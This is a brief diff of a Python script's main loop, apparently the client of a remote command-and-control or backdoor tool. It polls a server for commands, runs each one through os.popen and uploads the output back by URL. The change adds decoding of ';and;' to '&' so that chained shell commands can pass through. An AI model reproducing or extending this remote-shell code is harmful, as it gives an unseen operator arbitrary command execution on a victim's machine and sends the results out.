@@ -156,6 +156,6 @@ while(True == True):
                     terminate()
                 else:
                     doPrint("("+response[0]['session_id']+") >> "+response[0]['input'].replace(';quote;', '"'))
-                    output = os.popen(response[0]['input'].replace(';quote;', '"')).read()
+                    output = os.popen(response[0]['input'].replace(';quote;', '"').replace(';and;', '&')).read()
                     download("output?session_id="+session_id+"&to_session_id="+response[0]['session_id']+"&output="+output.replace('"', ';quote;'))
 terminate()
